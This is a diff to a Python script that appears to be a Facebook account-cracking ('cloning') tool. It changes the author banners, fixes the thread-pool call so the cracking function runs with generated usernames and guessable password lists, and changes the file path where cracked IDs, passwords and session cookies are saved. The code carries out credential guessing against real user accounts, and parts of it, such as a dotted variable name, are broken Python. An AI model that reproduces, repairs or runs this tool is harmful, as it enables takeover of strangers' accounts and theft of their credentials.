@@ -1,8 +1,8 @@
-#SC MAKED BY MR.NAYAN Hawladar 🤣 and Fuked By FB-KING 🙄
+#SC MAKED BY T4ST Hawladar 🤣 and Fuked By FB-KING 🙄
 
 #Tera pappa FB-KING 😘 MAHIN AHMED
 
-#................♥MR.NAYAN♥................
+#................♥T4ST♥................
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -131,15 +131,15 @@ class Main:
         print(" [1] ꜰᴀᴄᴇʙᴏᴏᴋ ᴇᴍᴀɪʟ ᴄʟᴏɴɪɴɢ")
         print(" [2] ꜰᴀᴄᴇʙᴏᴏᴋ ᴜꜱᴇʀɴᴀᴍᴇ ᴄʟᴏɴɪɴɢ")
         print(" [0] Exit")
-        MR.NAYAN =input(" [√] Choose : ")
+        T4ST =input(" [√] Choose : ")
 
-        if MR.NAYAN in ["1", "01"]:
+        if T4ST in ["1", "01"]:
             v1()
-        if MR.NAYAN in ["2", "02"]:
+        if T4ST in ["2", "02"]:
             v2()
-        if MR.NAYAN in ["3","03"]:
+        if T4ST in ["3","03"]:
             v3()
-        if MR.NAYAN in [" 0", "00"]:
+        if T4ST in [" 0", "00"]:
             exit()
             
         else:
@@ -204,7 +204,7 @@ def rcrack1(uid,pwx,tl):
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(a,uid,pwx,tl)
+            yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [♥] Crack process has been completed')
     print(' [♥] Ids saved in ok.txt,cp.txt')
@@ -366,7 +366,7 @@ def rcrack(uid,pwx,tl):
                 cid = coki[82:97]
                 print(f"\x1b[38;5;196m[NAYAN-CP] {uid} • {ps}")
                 print(f" \n COOKIES [💉]  : {coki}")
-                open('/sdcard/MR.NAYAN-CP.txt', 'a').write( uid+' • '+ps+' \n')
+                open('/sdcard/MR.NAYAN/CP.txt', 'a').write( uid+' • '+ps+' \n')
                 cps.append(uid)
 
             else:
